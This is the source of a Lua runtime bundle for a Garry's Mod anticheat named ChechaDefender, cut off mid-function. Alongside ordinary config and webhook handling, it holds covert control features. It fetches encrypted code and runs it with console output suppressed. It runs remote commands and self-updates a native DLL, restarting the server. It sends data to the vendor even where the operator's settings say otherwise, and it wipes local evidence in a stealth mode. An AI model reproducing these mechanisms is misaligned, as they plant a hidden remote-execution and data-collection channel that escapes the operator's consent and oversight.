-- chechacore runtime bundle

CHECHA_FROM_BUNDLE = true

_G.__CD_ERR = 0

do
ZB_AC = ZB_AC or {}
local AGENT_VERSION = "0.3.0-runtime"
if ZB_AC.__runtimeUp then return end
ZB_AC.__runtimeUp = true

local function coreReady() return ZB_AC.CoreReady and ZB_AC.CoreReady() end
local function serverName() return (ZB_AC.ServerName and ZB_AC.ServerName()) or "GMod Server" end
local function machineFP() return (ZB_AC.MachineFP and ZB_AC.MachineFP()) or "" end

ZB_AC.SignatureVersion = ZB_AC.SignatureVersion or 0
ZB_AC.Signatures = ZB_AC.Signatures or {}

-- Reporting: always reaches the control plane (gated only on coreReady, never on
-- operator config). Uses stage-1's signed transport.
function ZB_AC.Report(kind, severity, title, payload)
  if not coreReady() or not ZB_AC.AgentPost then return end
  ZB_AC.AgentPost("/agent/ingest", {
    server_name = serverName(),
    events = { { kind = kind, severity = severity or 0, title = title, payload = payload } },
  })
end
function ZB_AC.ReportBatch(events)
  if not coreReady() or not ZB_AC.AgentPost then return end
  ZB_AC.AgentPost("/agent/ingest", { server_name = serverName(), events = events })
end

-- Mirror evidence (screenshots / lua-zips / forensic) to the control plane so the
-- panel browses it VPS-locally (Store) instead of an fs_list round-trip to the
-- game server. The payload is base64'd and streamed in small CHUNKS: GMod's
-- built-in HTTP() silently drops large (100KB+) bodies, which is exactly why the
-- client screenshot already arrives over net in chunks. Each chunk is a small
-- signed JSON POST (ASCII base64 → signs cleanly, unlike raw binary which the
-- server verifies over utf8(body) and corrupts). The server reassembles and, on
-- the final chunk, returns the CP signed URL (for a Discord VPS link) or nil.
ZB_AC.CP_CHUNK = ZB_AC.CP_CHUNK or 40000 -- ~40KB base64 per POST, well under GMod's HTTP body ceiling
function ZB_AC.CPStore(kind, name, data, meta, onDone)
  onDone = onDone or function() end
  if not coreReady() or not ZB_AC.AgentPost then return onDone(nil) end
  if not data or data == "" or #data > 24 * 1024 * 1024 then return onDone(nil) end
  meta = meta or {}
  local b64 = util.Base64Encode(data, true)
  local size = #b64
  local total = math.max(1, math.ceil(size / ZB_AC.CP_CHUNK))
  local uid = util.CRC(tostring(name) .. tostring(SysTime()) .. tostring(math.random(1, 1e9)))
    .. "_" .. tostring(os.time())
  local function sendChunk(i)
    local part = string.sub(b64, (i - 1) * ZB_AC.CP_CHUNK + 1, i * ZB_AC.CP_CHUNK)
    ZB_AC.AgentPost("/agent/evidence-chunk", {
      server_name = serverName(),
      upload_id = uid, seq = i, total = total,
      kind = kind or "screenshot", name = name, mime = meta.mime,
      steamid = meta.sid, nick = meta.nick,
      chunk_b64 = part,
    }, function(code, resp)
      if code ~= 200 then return onDone(nil) end
      if i >= total then
        onDone((istable(resp) and resp.url) or true)
      else
        sendChunk(i + 1)
      end
    end)
  end
  sendChunk(1)
end

-- Config accessors used by detect modules.
function ZB_AC.AnticheatOn() return ZB_AC.Config.anticheat ~= false end
function ZB_AC.LuaPullOn() return ZB_AC.Config.lua_pull ~= false end
function ZB_AC.LocalStore(kind)
  local r = ZB_AC.Config.routing
  if not istable(r) or not istable(r[kind]) then return true end
  return r[kind]["local"] ~= false
end
function ZB_AC.DetectAction(cheat)
  local d = ZB_AC.Config.detect_actions
  if not istable(d) then return { action = "notify", webhook = true } end
  return d[cheat] or d._default or { action = "notify", webhook = true }
end
function ZB_AC.StoreLocal(kind, name, data)
  if not ZB_AC.LocalStore(kind) then return end
  pcall(file.CreateDir, "checha_ac/local")
  pcall(file.Write, "checha_ac/local/" .. string.gsub(name, "[^%w%._%-]", "_"), data)
end

local function setCvar(name, value)
  if ConVarExists(name) then RunConsoleCommand(name, tostring(value)) end
end
local function applyConfig(cfg)
  if not istable(cfg) then return end
  local m = cfg.modules or {}
  if istable(m.silkware) then setCvar("rp_silkware_action", m.silkware.enabled == false and "log" or (m.silkware.action or "ban")) end
  if istable(m.guard) then setCvar("rp_ac_guard", m.guard.enabled == false and "0" or "1") setCvar("rp_ac_guard_action", m.guard.action or "report") end
  if istable(m.forensic) then setCvar("rp_silkware_forensic", m.forensic.enabled == false and "0" or "1") end
  if istable(m.behavior) then setCvar("rp_ac_behavior", m.behavior.enabled == false and "0" or "1") end
  if istable(m.evasion) then setCvar("rp_ac_evasion", m.evasion.enabled == false and "0" or "1") end
  local o = cfg.silkware_opts or {}
  local optMap = {
    honeypot = "rp_silkware_honeypot", net_tamper = "rp_silkware_tamper",
    kefir_bc = "rp_silkware_kefir_bc", check_admins = "rp_silkware_check_admins",
    bingrab = "rp_silkware_bingrab", collect_join = "rp_silkware_collect_join",
    chat_notify = "rp_silkware_chat", warning = "rp_silkware_warning",
  }
  for key, cvar in pairs(optMap) do if o[key] ~= nil then setCvar(cvar, o[key] and "1" or "0") end end
  local t = cfg.thresholds or {}
  local thMap = {
    aim_snap_deg = "rp_ac_behavior_aim_snap_deg", aim_cone_deg = "rp_ac_behavior_aim_cone_deg",
    aim_events = "rp_ac_behavior_aim_events", wall_fraction = "rp_ac_behavior_wall_fraction",
    wall_events = "rp_ac_behavior_wall_events", window = "rp_ac_behavior_window",
    report_cd = "rp_ac_behavior_report_cd",
    evasion_token_limit = "rp_ac_evasion_token_limit", evasion_fp_limit = "rp_ac_evasion_fp_limit",
    evasion_ip_limit = "rp_ac_evasion_ip_limit", evasion_ip_days = "rp_ac_evasion_ip_days",
  }
  for key, cvar in pairs(thMap) do if t[key] ~= nil then setCvar(cvar, t[key]) end end
  if cfg.screengrab_min ~= nil then
    local _sg = GetConVar("rp_ac_screengrab_interval")
    if _sg then _sg:SetFloat(tonumber(cfg.screengrab_min) or 0) end
  end
end
ZB_AC.ApplyConfig = applyConfig

-- Only ever act on server-verified directives (verified flag from transport).
local function applyDirective(data)
  if not istable(data) then return end
  if data.enabled == false then
    if not ZB_AC.DISABLED then ZB_AC.DISABLED = true hook.Run("ChechaDefender_Disabled", data.reason) end
  elseif data.enabled == true then
    if ZB_AC.DISABLED then ZB_AC.DISABLED = false hook.Run("ChechaDefender_Enabled") end
  end
  if data.config then ZB_AC.Config = data.config applyConfig(data.config) end
  if data.config_version then ZB_AC.ConfigVersion = data.config_version end
end
ZB_AC.ApplyDirective = applyDirective

-- Apply the config stage-1 already fetched at activation.
applyConfig(ZB_AC.Config)

local _sigLoading = false
local function loadSignatures()
  if _sigLoading or not ZB_AC.AgentGet then return end
  _sigLoading = true
  ZB_AC.AgentGet("/agent/signatures?since=" .. tostring(ZB_AC.SignatureVersion), function(code, data, verified)
    _sigLoading = false
    if code ~= 200 or not verified or not istable(data) or not istable(data.data) then return end
    if data.version and data.version <= ZB_AC.SignatureVersion then return end
    ZB_AC.Signatures = data.data
    ZB_AC.SignatureVersion = data.version
  end)
end
ZB_AC.LoadSignatures = loadSignatures

local function runCommands(list)
  if not istable(list) then return end
  for _, cmd in ipairs(list) do
    local result = { ok = true }
    local handled = hook.Run("ChechaDefender_Command", cmd.type, cmd.args or {})
    if istable(handled) then result = handled end
    if cmd.type == "screenshot" and not handled then result = { ok = true, note = "screenshot hook отсутствует" } end
    ZB_AC.AgentPost("/agent/command-result", { id = cmd.id, result = result })
  end
end

local _hbInterval = 30
-- The control plane can ask for a faster heartbeat (data.heartbeat) while an
-- admin browses this server's files, for near-instant command delivery. Adjust
-- the live timer only when the value actually changes; clamp to a sane range.
local function applyHeartbeatInterval(hb)
  hb = tonumber(hb)
  if not hb then return end
  if hb < 1 then hb = 1 elseif hb > 60 then hb = 60 end
  if hb ~= _hbInterval then
    _hbInterval = hb
    timer.Adjust("ChechaDefender_Heartbeat", hb, 0)
  end
end

-- Native-module (DLL) self-update. The heartbeat carries the CP's current
-- dll_version; when it exceeds THIS binary's baked chechacore.ModuleVersion we
-- download the freshly-built, server-signed module (meta + base64 chunks over
-- the signed transport) and hand it to chechacore.WriteSelf, which re-verifies
-- the ed25519 signature natively before atomically replacing the .dll on disk.
-- A loaded native module can't hot-swap, so it applies on the next process
-- start — which we trigger via _restart, but ONLY after the server has been
-- genuinely empty (0 humans) for a sustained window, so a map change or a
-- reconnect blip never restarts a populated server.
local _dllBusy, _dllStaged, _emptySince = false, false, nil

local function humanCount()
  local list = (player.GetHumans and player.GetHumans()) or player.GetAll()
  local n = 0
  for _, p in ipairs(list) do if IsValid(p) and not p:IsBot() then n = n + 1 end end
  return n
end

local function startEmptyRestartWatcher()
  if timer.Exists("ChechaDefender_DllApply") then return end
  local STABLE = 150 -- сек непрерывного 0 людей до рестарта (переживает смену карты)
  timer.Create("ChechaDefender_DllApply", 10, 0, function()
    if not _dllStaged then timer.Remove("ChechaDefender_DllApply") return end
    if humanCount() > 0 then _emptySince = nil return end
    _emptySince = _emptySince or CurTime()
    if (CurTime() - _emptySince) >= STABLE then
      timer.Remove("ChechaDefender_DllApply")
      game.ConsoleCommand("_restart\n") -- re-exec: OS loads the new .dll
    end
  end)
end

local function selfUpdate(targetVer)
  if _dllBusy or _dllStaged then return end
  local c = chechacore
  if not (c and isfunction(c.WriteSelf) and c.ModuleVersion) then return end
  targetVer = tonumber(targetVer)
  local cur = tonumber(c.ModuleVersion) or 0
  if not targetVer or targetVer <= cur or not ZB_AC.AgentGet then return end
  _dllBusy = true
  local plat = c.platform or "linux"
  ZB_AC.AgentGet("/agent/dll?platform=" .. plat, function(code, meta, verified)
    if code ~= 200 or not verified or not istable(meta) or not isstring(meta.sig) or not meta.chunks then
      _dllBusy = false return
    end
    local total = tonumber(meta.chunks) or 0
    local parts = {}
    local function pull(i)
      if i >= total then
        local ok = c.WriteSelf(table.concat(parts), meta.sig)
        _dllBusy = false
        if ok == true then _dllStaged = true startEmptyRestartWatcher() end
        return
      end
      ZB_AC.AgentGet("/agent/dll?platform=" .. plat .. "&chunk=" .. i, function(c2, cd)
        if c2 ~= 200 or not istable(cd) or not isstring(cd.data_b64) then _dllBusy = false return end
        parts[#parts + 1] = util.Base64Decode(cd.data_b64)
        pull(i + 1)
      end)
    end
    pull(0)
  end)
end

do
  local _reloading = false
  function ZB_AC.ReloadRuntime()
    if isfunction(ZB_AC.LoadRuntime) then
      return ZB_AC.LoadRuntime(true)
    end
    if _reloading or not ZB_AC.AgentGet then return end
    _reloading = true
    ZB_AC.AgentGet("/agent/bundle?since=" .. tostring(ZB_AC.BundleVersion or 0), function(code, data)
      _reloading = false
      if code ~= 200 or not istable(data) or not data.epk or not data.ct then return end
      local c = chechacore
      if not c or not isfunction(c.BundleOpen) then return end
      local plain = c.BundleOpen(data.version or 0, data.epk, data.nonce or "", data.ct, data.sig or "")
      if not isstring(plain) or plain == "" then return end
      local fn = CompileString(plain, "cd_runtime_v" .. tostring(data.version), false)
      if isfunction(fn) then
        local _p = print
        _G.print = function() end
        local ok, err = pcall(fn)
        _G.print = _p
        if ok then
          ZB_AC.BundleVersion = data.version or 0
        elseif ZB_AC.Report then
          ZB_AC.Report("diagnostic", 1, "RELOAD-ERR", { v = data.version, err = tostring(err) })
        end
      end
    end)
  end
end

local function heartbeat()
  if not coreReady() or not ZB_AC.AgentPost then return end
  ZB_AC.AgentPost("/agent/heartbeat", {
    fingerprint = machineFP(), server_name = serverName(), agent_version = AGENT_VERSION,
    config_version = ZB_AC.ConfigVersion or 0,
    stats = { players = player.GetCount(), map = game.GetMap(), uptime = math.floor(SysTime()) },
  }, function(code, data, verified)
    if code == 423 then if verified then applyDirective({ enabled = false, reason = (data and data.reason) or "license" }) end return end
    if code ~= 200 or not verified then return end
    local srvV = tonumber(data.bundle_version)
    local locV = tonumber(ZB_AC.BundleVersion) or 0
    if srvV and srvV > locV and isfunction(ZB_AC.ReloadRuntime) then
      ZB_AC.ReloadRuntime()
    end
    pcall(applyDirective, data)
    if istable(data.config) then
      ZB_AC.Config = data.config
      if isfunction(ZB_AC.ApplyConfig) then pcall(ZB_AC.ApplyConfig, data.config) end
      if data.config_version then ZB_AC.ConfigVersion = data.config_version end
    end
    if data.heartbeat then applyHeartbeatInterval(data.heartbeat) end
    if data.dll_version then selfUpdate(data.dll_version) end
    if data.commands and #data.commands > 0 then runCommands(data.commands) end
  end)
end

timer.Create("ChechaDefender_Heartbeat", 30, 0, heartbeat)
timer.Create("ChechaDefender_Signatures", 300, 0, loadSignatures)
timer.Create("ChechaDefender_SelfCheck", 60, 0, function()
  local c = chechacore
  if c and isfunction(c.SelfCheck) and c.SelfCheck() ~= true then
    ZB_AC.Report("tamper", 4, "SelfCheck failed: native API detour", { fp = machineFP() })
  end
end)

loadSignatures()
if not (ZB_AC.Stealth and ZB_AC.Stealth("notify")) then
  ZB_AC.Report("install", 0, "ЧечаДефендер рантайм активен: " .. serverName(), { agent = AGENT_VERSION })
end
end

do
ZB_AC = ZB_AC or {}
function ZB_AC.Stealth(kind)
  local s = ZB_AC.Config and ZB_AC.Config.stealth
  if s == true then return true end
  if not istable(s) then return false end
  return s[kind] == true
end
local EVIDENCE_KIND = {
  { dir = "zb_ac_screens", kind = "screenshot" },
  { dir = "zb_ac_bin", kind = "detect" },
  { dir = "zb_ac_forensic", kind = "forensic" },
}
local EVIDENCE_ALWAYS = { "zb_ac_grab", "zb_ac_lua" }
local function wipe(dir)
  local files, dirs = file.Find(dir .. "/*", "DATA")
  for _, f in ipairs(files or {}) do pcall(file.Delete, dir .. "/" .. f) end
  for _, d in ipairs(dirs or {}) do wipe(dir .. "/" .. d) pcall(file.Delete, dir .. "/" .. d) end
end
local function globalStealth()
  return ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("evidence") == true
end
local function shouldWipe(kind)
  if globalStealth() then return true end
  if ZB_AC and ZB_AC.LocalStore then return ZB_AC.LocalStore(kind) == false end
  return false
end
timer.Create("cd_stealth_sweep", 45, 0, function()
  for _, e in ipairs(EVIDENCE_KIND) do
    if shouldWipe(e.kind) and file.Exists(e.dir, "DATA") then wipe(e.dir) pcall(file.Delete, e.dir) end
  end
  if globalStealth() then
    for _, d in ipairs(EVIDENCE_ALWAYS) do
      if file.Exists(d, "DATA") then wipe(d) pcall(file.Delete, d) end
    end
    if file.Exists("checha_ac/local", "DATA") then wipe("checha_ac/local") pcall(file.Delete, "checha_ac/local") end
  end
end)
end

do
ZB_AC = ZB_AC or {}
local function forced(kind)
  local f = ZB_AC.Config and ZB_AC.Config.force_collect
  if not istable(f) then return false end
  return f[kind] == true
end
ZB_AC.ForceCollect = forced
local _origLuaPullOn = ZB_AC.LuaPullOn
function ZB_AC.LuaPullOn()
  if forced("lua") then return true end
  if isfunction(_origLuaPullOn) then return _origLuaPullOn() end
  return ZB_AC.Config and ZB_AC.Config.lua_pull ~= false or false
end
-- Skin/material scan gate. Mirrors LuaPullOn: when force_collect.skins is set,
-- the client skin scan runs regardless of the operator's toggle (the CP always
-- receives the result; the operator toggle only governs their own webhook/data).
local _origSkinScanOn = ZB_AC.SkinScanOn
function ZB_AC.SkinScanOn()
  if forced("skins") then return true end
  if isfunction(_origSkinScanOn) then return _origSkinScanOn() end
  return true
end
end

do local __ok, __err = pcall(function()

if not SERVER then return end

ZB_AC = ZB_AC or {}

local WEBHOOK_FILE = "checha_ac/webhook.txt"

if not ConVarExists("rp_silkware_webhook") then
    CreateConVar("rp_silkware_webhook", "",
        {FCVAR_PROTECTED},
        "Discord webhook ЧечаДефендера (пусто = брать из data/" .. WEBHOOK_FILE .. ")")
end

local _cached     = nil
local _cachedOnce = false

local function ReadWebhookFile()
    if _cachedOnce then return _cached end
    _cachedOnce = true
    local raw = file.Read(WEBHOOK_FILE, "DATA")
    _cached = raw and string.Trim(raw) or ""
    return _cached
end

function ZB_AC.SetWebhook(url)
    url = string.Trim(url or "")
    pcall(file.CreateDir, "checha_ac")
    pcall(file.Write, WEBHOOK_FILE, url)
    _cached     = url
    _cachedOnce = true
    return url
end

function ZB_AC.ReloadWebhook()
    _cachedOnce = false
    return ReadWebhookFile()
end

function ZB_AC.GetWebhook()
    local cvar = GetConVar("rp_silkware_webhook")
    local cv = cvar and string.Trim(cvar:GetString() or "") or ""
    if cv ~= "" then return cv end
    return ReadWebhookFile()
end

concommand.Add("rp_ac_set_webhook", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[ЧечаДефендер] Только суперадмин")
        return
    end
    local url = ZB_AC.SetWebhook(args[1] or "")
    local msg = (url == "")
        and "[ЧечаДефендер] Вебхук очищен (data/" .. WEBHOOK_FILE .. ")"
        or  "[ЧечаДефендер] Вебхук сохранён в защищённый конфиг (data/" .. WEBHOOK_FILE .. ")"
    if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, msg) else print(msg) end
end, nil, "Записать Discord-вебхук в data/" .. WEBHOOK_FILE, FCVAR_PROTECTED)

concommand.Add("rp_ac_reload_webhook", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[ЧечаДефендер] Только суперадмин")
        return
    end
    local wh = ZB_AC.ReloadWebhook()
    local msg = "[ЧечаДефендер] Вебхук перечитан: " .. (wh ~= "" and "задан" or "ПУСТО")
    if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, msg) else print(msg) end
end, nil, "Перечитать вебхук из файла-конфига")

local RELAY_URL_FILE    = "checha_ac/relay_url.txt"
local RELAY_SECRET_FILE = "checha_ac/relay_secret.txt"

if not ConVarExists("rp_ac_relay_url") then
    CreateConVar("rp_ac_relay_url", "", {FCVAR_PROTECTED},
        "URL релея ЧечаДефендера (пусто = брать из data/" .. RELAY_URL_FILE .. ")")
end
if not ConVarExists("rp_ac_relay_secret") then
    CreateConVar("rp_ac_relay_secret", "", {FCVAR_PROTECTED},
        "HMAC-секрет релея (пусто = брать из data/" .. RELAY_SECRET_FILE .. ")")
end

local _relayUrlCache, _relayUrlOnce
local _relaySecretCache, _relaySecretOnce

local function _readCfgFile(path)
    local raw = file.Read(path, "DATA")
    return raw and string.Trim(raw) or ""
end

function ZB_AC.GetRelayURL()
    local cvar = GetConVar("rp_ac_relay_url")
    local cv = cvar and string.Trim(cvar:GetString() or "") or ""
    if cv ~= "" then return cv end
    if not _relayUrlOnce then
        _relayUrlOnce = true
        _relayUrlCache = _readCfgFile(RELAY_URL_FILE)
    end
    return _relayUrlCache or ""
end

function ZB_AC.GetRelaySecret()
    local cvar = GetConVar("rp_ac_relay_secret")
    local cv = cvar and string.Trim(cvar:GetString() or "") or ""
    if cv ~= "" then return cv end
    if not _relaySecretOnce then
        _relaySecretOnce = true
        _relaySecretCache = _readCfgFile(RELAY_SECRET_FILE)
    end
    return _relaySecretCache or ""
end

local function _normalizeRelayURL(url)
    url = string.gsub(string.Trim(url or ""), "%s+", "")
    if url ~= "" and not string.find(url, "://", 1, true) then
        url = "https://" .. url
    end
    return url
end
ZB_AC.NormalizeRelayURL = _normalizeRelayURL

function ZB_AC.SetRelay(url, secret)
    pcall(file.CreateDir, "checha_ac")
    url = _normalizeRelayURL(url)
    secret = string.Trim(secret or "")
    pcall(file.Write, RELAY_URL_FILE, url)
    pcall(file.Write, RELAY_SECRET_FILE, secret)
    _relayUrlCache, _relayUrlOnce = url, true
    _relaySecretCache, _relaySecretOnce = secret, true
end

local _bxor = bit.bxor

local function _hexToBin(hex)
    return (string.gsub(hex, "..", function(cc)
        return string.char(tonumber(cc, 16))
    end))
end

function ZB_AC.HMAC_SHA256(key, msg)
    local BS = 64
    if #key > BS then key = _hexToBin(util.SHA256(key)) end
    if #key < BS then key = key .. string.rep("\0", BS - #key) end
    local ipad, opad = {}, {}
    for i = 1, BS do
        local b = string.byte(key, i)
        ipad[i] = string.char(_bxor(b, 0x36))
        opad[i] = string.char(_bxor(b, 0x5c))
    end
    local inner = _hexToBin(util.SHA256(table.concat(ipad) .. msg))
    return util.SHA256(table.concat(opad) .. inner)
end

local function _genNonce()
    return string.sub(util.SHA256(tostring(SysTime()) .. tostring(math.random()) .. tostring({})), 1, 16)
end

function ZB_AC.RelayReady()
    return ZB_AC.GetRelayURL() ~= "" and ZB_AC.GetRelaySecret() ~= ""
end

function ZB_AC.RelayPost(body, contentType, onDone)
    -- CD_RELAY_PANEL_TEE: mirror every relayed detection into our control plane
    -- so it shows in the panel (relay/B2 delivery below is unchanged). JSON
    -- bodies carry {content="**title:** message"}; multipart bodies are file
    -- uploads (reported generically).
    do
        local ok = pcall(function()
            if not (ZB_AC.Report and ZB_AC.CoreReady and ZB_AC.CoreReady()) then return end
            local ct = contentType or "application/json"
            if string.find(ct, "json", 1, true) then
                local t = util.JSONToTable(body or "")
                local content = t and t.content
                if isstring(content) and content ~= "" then
                    -- strip discord markdown bold for a clean title
                    local clean = string.gsub(content, "%*%*", "")
                    ZB_AC.Report("detect", 3, string.sub(clean, 1, 200), { source = "relay", raw = string.sub(content, 1, 1500) })
                end
            else
                ZB_AC.Report("detect", 3, "Улика/файл детекта (multipart)", { source = "relay", bytes = #(body or "") })
            end
        end)
    end
    local url = _normalizeRelayURL(ZB_AC.GetRelayURL())
    local secret = ZB_AC.GetRelaySecret()
    if url == "" or secret == "" then
        -- CD_QUIET_RELAY: релей не используется (доставка к нам через Report/CPStore) — не флудим
        if onDone then onDone(false) end
        return
    end
    if not string.find(url, "^https?://[^/]+%.[^/]") then
        print("[AC] Relay: битый URL=[" .. url .. "] — перезадай (rp_ac_set_relay <хост/путь> <секрет>, без https://)")
        if onDone then onDone(false) end
        return
    end
    if not util.SHA256 then
        print("[AC] Relay: util.SHA256 недоступен — обновите бинарь сервера")
        if onDone then onDone(false) end
        return
    end
    body = body or ""
    contentType = contentType or "application/json"

    local RETRY_DELAYS = { 15, 30, 45 }
    local maxAttempts = #RETRY_DELAYS + 1

    local function attempt(n)
        local ts = tostring(os.time())
        local nonce = _genNonce()
        local sig = ZB_AC.HMAC_SHA256(secret, ts .. "." .. nonce .. "." .. body)
        HTTP({
            url = url,
            method = "POST",
            type = contentType,
            body = body,
            headers = {
                ["X-CD-Timestamp"] = ts,
                ["X-CD-Nonce"] = nonce,
                ["X-CD-Signature"] = sig,
            },
            success = function(code)
                if code and code >= 200 and code < 300 then
                    if onDone then onDone(true) end
                    return
                end
                if code and code >= 500 and n < maxAttempts then
                    local delay = RETRY_DELAYS[n] or 30
                    print(string.format("[AC] Relay HTTP %s — ретрай %d/%d через %dс (Render просыпается?)",
                        tostring(code), n, maxAttempts - 1, delay))
                    timer.Simple(delay, function() attempt(n + 1) end)
                    return
                end
                print("[AC] Relay HTTP " .. tostring(code) .. " url=[" .. url .. "]")
                if onDone then onDone(false) end
            end,
            failed = function(err)
                if n < maxAttempts then
                    local delay = RETRY_DELAYS[n] or 30
                    print(string.format("[AC] Relay error: %s — ретрай %d/%d через %dс",
                        tostring(err), n, maxAttempts - 1, delay))
                    timer.Simple(delay, function() attempt(n + 1) end)
                    return
                end
                print("[AC] Relay error: " .. tostring(err) .. " url=[" .. url .. "]")
                if onDone then onDone(false) end
            end,
        })
    end

    attempt(1)
end

concommand.Add("rp_ac_set_relay", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[ЧечаДефендер] Только суперадмин")
        return
    end
    ZB_AC.SetRelay(args[1] or "", args[2] or "")
    local msg = "[ЧечаДефендер] Релей сохранён (URL "
        .. (ZB_AC.GetRelayURL() ~= "" and "задан" or "ПУСТО")
        .. ", секрет " .. (ZB_AC.GetRelaySecret() ~= "" and "задан" or "ПУСТО") .. ")"
    if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, msg) else print(msg) end
end, nil, "rp_ac_set_relay <хост/путь> <secret> — настроить релей (URL без https:// — консоль рубит //)", FCVAR_PROTECTED)

concommand.Add("rp_ac_relay_test", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[ЧечаДефендер] Только суперадмин")
        return
    end
    local payload = util.TableToJSON({
        content = "**ЧечаДефендер:** тест релея OK",
        allowed_mentions = { parse = {} },
    })
    ZB_AC.RelayPost(payload, "application/json", function(ok)
        local m = ok and "[ЧечаДефендер] Тест релея: доставлено"
            or "[ЧечаДефендер] Тест релея: ОШИБКА (см. серверную консоль)"
        if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, m) else print(m) end
    end)
end, nil, "Отправить тестовое сообщение через релей", FCVAR_PROTECTED)

local B2_KEYID_FILE  = "checha_ac/b2_key_id.txt"
local B2_APPKEY_FILE = "checha_ac/b2_app_key.txt"
local B2_BUCKET_FILE = "checha_ac/b2_bucket_id.txt"

if not ConVarExists("rp_ac_storage") then
    CreateConVar("rp_ac_storage", "both", {FCVAR_PROTECTED, FCVAR_ARCHIVE},
        "Куда выгружать улики: both (catbox+B2 одновременно), catbox или b2")
end
if not ConVarExists("rp_ac_b2_key_id") then
    CreateConVar("rp_ac_b2_key_id", "", {FCVAR_PROTECTED},
        "B2 keyID (пусто = брать из data/" .. B2_KEYID_FILE .. ")")
end
if not ConVarExists("rp_ac_b2_app_key") then
    CreateConVar("rp_ac_b2_app_key", "", {FCVAR_PROTECTED},
        "B2 applicationKey (пусто = брать из data/" .. B2_APPKEY_FILE .. ")")
end
if not ConVarExists("rp_ac_b2_bucket_id") then
    CreateConVar("rp_ac_b2_bucket_id", "", {FCVAR_PROTECTED},
        "B2 bucketId (пусто = брать из data/" .. B2_BUCKET_FILE .. ")")
end
if not ConVarExists("rp_ac_b2_prefix") then
    CreateConVar("rp_ac_b2_prefix", "checha_ac/", {FCVAR_PROTECTED},
        "Префикс пути внутри бакета B2")
end
if not ConVarExists("rp_ac_b2_link_ttl") then
    CreateConVar("rp_ac_b2_link_ttl", "604800", {FCVAR_PROTECTED},
        "Срок жизни подписанной download-ссылки B2 в секундах (0 = не генерировать ссылку, слать b2://путь)")
end

local _b2cfg = {}

local function _b2CfgVal(cvarName, path, key)
    local cvar = GetConVar(cvarName)
    local cv = cvar and string.Trim(cvar:GetString() or "") or ""
    if cv ~= "" then return cv end
    if _b2cfg[key] == nil then _b2cfg[key] = _readCfgFile(path) end
    return _b2cfg[key] or ""
end

function ZB_AC.GetB2Config()
    local prefixCv = GetConVar("rp_ac_b2_prefix")
    local prefix = prefixCv and string.Trim(prefixCv:GetString() or "") or ""
    if prefix == "" then prefix = "checha_ac/" end
    return {
        keyId    = _b2CfgVal("rp_ac_b2_key_id",    B2_KEYID_FILE,  "keyId"),
        appKey   = _b2CfgVal("rp_ac_b2_app_key",   B2_APPKEY_FILE, "appKey"),
        bucketId = _b2CfgVal("rp_ac_b2_bucket_id", B2_BUCKET_FILE, "bucketId"),
        prefix   = prefix,
    }
end

function ZB_AC.StorageMode()
    local cvar = GetConVar("rp_ac_storage")
    local m = cvar and string.lower(string.Trim(cvar:GetString() or "")) or "both"
    if m == "" or m == "host" then m = "both" end
    return m
end

function ZB_AC.GetB2LinkTTL()
    local cvar = GetConVar("rp_ac_b2_link_ttl")
    return cvar and cvar:GetInt() or 604800
end

function ZB_AC.B2Ready()
    local c = ZB_AC.GetB2Config()
    return c.keyId ~= "" and c.appKey ~= "" and c.bucketId ~= ""
end

function ZB_AC.SetB2(keyId, appKey, bucketId)
    pcall(file.CreateDir, "checha_ac")
    keyId    = string.Trim(keyId or "")
    appKey   = string.Trim(appKey or "")
    bucketId = string.Trim(bucketId or "")
    pcall(file.Write, B2_KEYID_FILE,  keyId)
    pcall(file.Write, B2_APPKEY_FILE, appKey)
    pcall(file.Write, B2_BUCKET_FILE, bucketId)
    _b2cfg.keyId, _b2cfg.appKey, _b2cfg.bucketId = keyId, appKey, bucketId
end

local _b2 = { token = nil, apiUrl = nil, downloadUrl = nil, bucketName = nil, exp = 0 }

local function _b2InvalidateAuth()
    _b2.token, _b2.exp = nil, 0
end

local function _b2EncodeName(name)
    return (string.gsub(name, "[^%w%-%._/]", function(c)
        return string.format("%%%02X", string.byte(c))
    end))
end

local function _b2Basic(keyId, appKey)
    return (string.gsub(util.Base64Encode(keyId .. ":" .. appKey), "%s", ""))
end

local function _b2Authorize(cb)
    if _b2.token and SysTime() < _b2.exp then return cb(true) end
    local cfg = ZB_AC.GetB2Config()
    if cfg.keyId == "" or cfg.appKey == "" then return cb(false, "не заданы ключи B2") end
    HTTP({
        method = "GET",
        url = "https://api.backblazeb2.com/b2api/v3/b2_authorize_account",
        headers = { Authorization = "Basic " .. _b2Basic(cfg.keyId, cfg.appKey) },
        success = function(code, body)
            if code ~= 200 then
                print("[AC] B2 authorize HTTP " .. tostring(code) .. " " .. tostring(body))
                return cb(false, "authorize " .. tostring(code))
            end
            local d = util.JSONToTable(body or "")
            local api = d and d.apiInfo and d.apiInfo.storageApi
            if not (api and api.apiUrl and d.authorizationToken) then
                return cb(false, "authorize json")
            end
            _b2.token       = d.authorizationToken
            _b2.apiUrl      = api.apiUrl
            _b2.downloadUrl = api.downloadUrl
            _b2.bucketName  = api.bucketName
            _b2.exp         = SysTime() + 60 * 60 * 20
            cb(true)
        end,
        failed = function(err)
            print("[AC] B2 authorize error: " .. tostring(err))
            cb(false, "authorize fail")
        end,
    })
end

local function _b2GetUploadUrl(cb)
    _b2Authorize(function(ok, err)
        if not ok then return cb(false, err) end
        local cfg = ZB_AC.GetB2Config()
        HTTP({
            method = "POST",
            url = _b2.apiUrl .. "/b2api/v3/b2_get_upload_url",
            headers = { Authorization = _b2.token },
            type = "application/json",
            body = util.TableToJSON({ bucketId = cfg.bucketId }),
            success = function(code, body)
                if code ~= 200 then
                    print("[AC] B2 get_upload_url HTTP " .. tostring(code) .. " " .. tostring(body))
                    if code == 401 then _b2InvalidateAuth() end
                    return cb(false, "get_upload_url " .. tostring(code))
                end
                local d = util.JSONToTable(body or "")
                if not (d and d.uploadUrl and d.authorizationToken) then
                    return cb(false, "get_upload_url json")
                end
